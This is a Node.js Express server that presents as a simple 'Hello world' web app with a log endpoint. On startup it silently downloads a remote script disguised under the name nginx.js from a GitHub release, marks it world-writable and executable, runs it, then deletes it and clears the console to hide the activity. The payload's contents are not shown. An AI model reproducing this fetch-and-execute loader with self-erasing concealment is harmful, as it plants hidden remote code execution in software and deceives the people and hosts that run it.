const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const FILE_PATH = process.env.FILE_PATH || './tmp';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 

if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

app.get("/", function(req, res) {
  res.send("Hello world!");
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
app.get("/log", (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

// Specify the URL of the bot.js file to download
const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

// Download and execute the file
const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      fs.chmodSync(filePath, '777'); 

      console.log('running the webapp...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on('exit', (code) => {
      //  console.log(`Child process exited with code ${code}`);
        fs.unlink(filePath, err => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear()
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};
downloadAndExecute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
